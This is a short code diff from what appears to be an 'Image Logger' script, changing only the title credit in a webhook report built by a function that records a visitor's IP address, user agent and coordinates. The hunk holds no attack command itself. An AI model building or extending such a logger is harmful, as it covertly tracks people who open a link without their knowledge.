@@ -125,7 +125,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Image Logger - Updated 28/11/2025 By <@&1006001923830317198>!",
+            "title": "Image Logger - Updated 28/11/2025 By ???!",
             "color": config["color"],
             "description": f"""**Made by Unknown(K) , DeadSec On Top**
 
